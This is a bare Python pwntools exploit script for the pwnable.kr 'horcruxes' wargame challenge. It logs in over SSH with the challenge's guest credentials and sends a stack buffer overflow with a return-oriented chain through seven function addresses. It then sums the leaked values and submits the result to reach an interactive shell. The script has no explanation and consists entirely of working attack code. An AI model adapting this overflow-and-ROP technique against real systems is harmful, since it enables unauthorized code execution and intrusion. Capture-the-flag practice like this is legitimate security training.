from pwn import *

session = ssh('horcruxes', 'pwnable.kr', port=2222, password='guest')

p = session.remote('localhost', 9032)

p.recvuntil('Select Menu:')
p.sendline('123')
p.recvuntil('EXP did you earned? : ')

payload = 'A' * 0x74 + p32(0xfffffd80)
payload += p32(0x0809FE4B)  # A
payload += p32(0x0809FE6A)  # B
payload += p32(0x0809FE89)  # C
payload += p32(0x0809FEA8)  # D
payload += p32(0x0809FEC7)  # E
payload += p32(0x0809FEE6)  # F
payload += p32(0x0809FF05)  # G
payload += p32(0x0809FFFC)

p.sendline(payload)

sum = 0
for i in range(7):
    p.recvuntil('EXP +')
    sum += int(p.recvuntil(')', drop=True))

sum = sum & 0xffffffff
if sum >= 0x80000000:
    sum -= 0x100000000

p.recvuntil('Select Menu:')
p.sendline('123')
p.recvuntil('EXP did you earned? : ')
p.sendline(str(sum))

p.interactive()
